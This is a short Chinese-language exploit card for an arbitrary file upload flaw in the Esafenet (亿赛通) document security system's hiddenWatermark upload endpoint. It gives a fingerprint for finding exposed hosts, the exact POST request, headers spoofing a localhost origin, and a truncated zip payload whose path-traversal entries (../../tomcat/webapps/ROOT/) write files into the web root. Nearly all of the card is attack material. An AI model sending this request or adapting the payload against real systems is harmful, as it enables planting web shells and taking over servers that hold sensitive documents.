# 亿赛通电子文档安全管理系统hiddenWatermark任意文件上传漏洞

- **系统**：亿赛通电子文档安全管理系统hiddenWatermark　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /CDGServer3/hiddenWatermark/uploadFile HTTP/1.1`
- **关键头**：`Content-Length: 2190`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3lm0J8uE…`　`X-Forwarded-For: 127.0.0.1`　`X-Originating-Ip: 127.0.0.1`　`X-Remote-Addr: 127.0.0.1`　`X-Remote-Ip: 127.0.0.1`

**请求体 / payload**
```
------WebKitFormBoundary3lm0J8uEuFHxy191
Content-Disposition: form-data; name="doc"; filename="jskdjks.zip"
Content-Type: application/zip
PK�����{L9X���������������../PK�����{L9X���������������../../PK�����{L9X������������	���../../../PK�����{L9X���������������../../../../PK�����{L9X���������������../../../../../PK�����{L9X���������������../../../../../tomcat/PK�����{L9X���������������../../../../../tomcat/webapps/PK�����{L9X������������#���../../../../../tomcat/webapps/ROOT/PK�����tL9X���������������theme/theme/PK�����XL9X���������������theme/PK����gL9…（脚本共 5084 字，完整版见原文）
```

**其他**
- 亿赛通电子文档安全管理系统hiddenWatermark任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统